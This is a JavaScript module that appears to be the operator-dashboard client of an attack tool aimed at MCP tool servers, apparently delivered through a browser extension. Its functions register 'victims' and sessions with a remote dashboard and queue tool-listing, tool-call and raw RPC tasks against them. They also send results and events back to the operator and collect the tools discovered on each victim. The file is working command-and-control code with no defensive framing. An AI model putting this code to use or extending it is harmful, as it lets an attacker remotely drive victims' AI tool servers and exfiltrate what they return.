export function normalizeDashboardBase(value) {
  const raw = String(value || "").trim().replace(/\/+$/, "");

  if (!raw) {
    throw new Error("Dashboard base URL is required.");
  }

  const url = new URL(raw);

  if (url.protocol !== "http:" && url.protocol !== "https:") {
    throw new Error("Dashboard base URL must use HTTP or HTTPS.");
  }

  url.pathname = url.pathname.replace(/\/+$/, "");
  url.search = "";
  url.hash = "";
  return url.toString().replace(/\/+$/, "");
}

export function dashboardHeaders(token, options = {}) {
  const headers = {
    "Content-Type": "application/json"
  };
  const value = String(token || "").trim();
  const ingestToken = String(options.ingestToken || "").trim();

  if (value) {
    headers.Authorization = `Bearer ${value}`;
  }

  if (ingestToken) {
    headers["X-MCP-Binder-Ingest-Token"] = ingestToken;
  }

  return headers;
}

export function describeDashboardFetchFailure(error, baseUrl) {
  const message = error instanceof Error ? error.message : String(error || "");
  const base = (() => {
    try {
      return normalizeDashboardBase(baseUrl);
    } catch {
      return String(baseUrl || "").trim() || "(missing dashboard URL)";
    }
  })();

  if (error instanceof TypeError || /failed to fetch/i.test(message)) {
    return `Dashboard request failed before HTTP completed for ${base}. Check that the packed extension includes this dashboard origin as a host permission and that the dashboard service is reachable.`;
  }

  return `Dashboard request failed for ${base}: ${message || "unknown error"}`;
}

export async function fetchDashboardState(baseUrl, token) {
  return dashboardRequest(baseUrl, "/api/state", { token });
}

export async function fetchDashboardExport(baseUrl, token) {
  return dashboardRequest(baseUrl, "/api/export", { token });
}

export async function clearDashboardState(baseUrl, token) {
  return dashboardRequest(baseUrl, "/api/clear", { method: "POST", token });
}

export async function queueDashboardTask(baseUrl, token, sessionId, task) {
  const sid = String(sessionId || "").trim();

  if (!sid) {
    throw new Error("Session ID is required.");
  }

  return dashboardRequest(baseUrl, `/api/tasks/${encodeURIComponent(sid)}`, {
    method: "POST",
    token,
    body: normalizeTask(task)
  });
}

export async function takeDashboardTasks(baseUrl, sessionId, ingestToken = "") {
  const sid = String(sessionId || "").trim();

  if (!sid) {
    throw new Error("Session ID is required.");
  }

  return normalizeTaskResponse(await dashboardRequest(baseUrl, `/api/tasks/${encodeURIComponent(sid)}`, { ingestToken }));
}

export async function registerDashboardVictim(baseUrl, victim, ingestToken = "") {
  return dashboardRequest(baseUrl, "/api/victims", {
    method: "POST",
    ingestToken,
    body: victim
  });
}

export async function registerDashboardSession(baseUrl, session, ingestToken = "") {
  return dashboardRequest(baseUrl, "/api/sessions", {
    method: "POST",
    ingestToken,
    body: session
  });
}

export async function recordDashboardEvent(baseUrl, event, ingestToken = "") {
  return dashboardRequest(baseUrl, "/api/events", {
    method: "POST",
    ingestToken,
    body: event
  });
}

export async function recordDashboardResult(baseUrl, result, ingestToken = "") {
  return dashboardRequest(baseUrl, "/api/results", {
    method: "POST",
    ingestToken,
    body: result
  });
}

export function summarizeDashboardState(state) {
  const victims = Object.values(state?.victims || {});
  const sessions = Object.values(state?.sessions || {});
  const results = Array.isArray(state?.results) ? state.results : [];

  return {
    victims,
    sessions,
    results,
    connectedSessions: sessions.filter((session) => sessionReady(session, results)).length
  };
}

export function discoveredToolsForSession(state, sessionId) {
  const results = Array.isArray(state?.results) ? state.results : [];
  const seen = new Set();
  const tools = [];

  for (const result of results.filter((item) => resultSessionId(item) === sessionId)) {
    for (const tool of findTools(result.data)) {
      if (!tool.name || seen.has(tool.name)) {
        continue;
      }

      seen.add(tool.name);
      tools.push(tool);
    }
  }

  return tools.sort((a, b) => String(a.name).localeCompare(String(b.name)));
}

export function resultsForSession(state, sessionId) {
  const results = Array.isArray(state?.results) ? state.results : [];
  return results
    .filter((result) => resultSessionId(result) === sessionId)
    .sort((a, b) => String(b.receivedAt || "").localeCompare(String(a.receivedAt || "")));
}

export function tasksForSession(state, sessionId) {
  const tasks = state?.tasks?.[sessionId];
  return Array.isArray(tasks) ? tasks : [];
}

export function buildToolsListTask() {
  return {
    kind: "tools/list",
    args: {}
  };
}

export function buildToolsCallTask(toolName, args = {}) {
  return {
    kind: "tools/call",
    tool: String(toolName || "").trim(),
    args: args && typeof args === "object" ? args : {}
  };
}

export function buildRawRpcTask(rpc) {
  return {
    kind: "rpc",
    rpc
  };
}

async function dashboardRequest(baseUrl, path, options = {}) {
  const base = normalizeDashboardBase(baseUrl);
  let response;
  try {
    response = await fetch(`${base}${path}`, {
      method: options.method || "GET",
      headers: dashboardHeaders(options.token, { ingestToken: options.ingestToken }),
      body: options.body ? JSON.stringify(options.body) : undefined,
      cache: "no-store"
    });
  } catch (error) {
    throw new Error(describeDashboardFetchFailure(error, base));
  }

  const text = await response.text();
  let body = null;

  if (text) {
    try {
      body = JSON.parse(text);
    } catch {
      body = { raw: text };
    }
  }

  if (!response.ok) {
    throw new Error(body?.error || body?.raw || `Dashboard request failed with HTTP ${response.status}.`);
  }

  return body || {};
}

function normalizeTask(task) {
  const kind = String(task?.kind || "tools/list").trim();

  if (kind === "tools/list") {
    return buildToolsListTask();
  }

  if (kind === "tools/call") {
    const tool = String(task?.tool || "").trim();

    if (!tool) {
      throw new Error("Tool name is required.");
    }

    return buildToolsCallTask(tool, task.args || {});
  }

  if (kind === "rpc") {
    if (!task?.rpc || typeof task.rpc !== "object") {
      throw new Error("Raw RPC task requires an RPC object.");
    }

    return buildRawRpcTask(task.rpc);
  }

  throw new Error(`Unsupported task kind: ${kind}`);
}

function normalizeTaskResponse(body) {
  if (Array.isArray(body)) {
    return body;
  }

  if (body?.task) {
    return [body.task].filter(Boolean);
  }

  if (Array.isArray(body?.tasks)) {
    return body.tasks;
  }

  return [];
}

function sessionReady(session, results) {
  const status = String(session?.status || "");
  return status === "initialized" ||
    status === "polling" ||
    status.startsWith("task:") ||
    status === "tools/list" ||
    status.includes("tools-listed") ||
    status.includes("initialized") ||
    results.some((result) => resultSessionId(result) === session?.id);
}

function resultSessionId(result) {
  return result?.session || result?.sessionId || "";
}

function findTools(value, out = []) {
  if (!value) {
    return out;
  }

  if (Array.isArray(value)) {
    for (const item of value) {
      findTools(item, out);
    }
    return out;
  }

  if (typeof value !== "object") {
    return out;
  }

  if (Array.isArray(value.tools)) {
    for (const tool of value.tools) {
      if (tool && typeof tool === "object" && tool.name) {
        out.push(tool);
      }
    }
  }

  for (const item of Object.values(value)) {
    if (item && typeof item === "object") {
      findTools(item, out);
    }
  }

  return out;
}
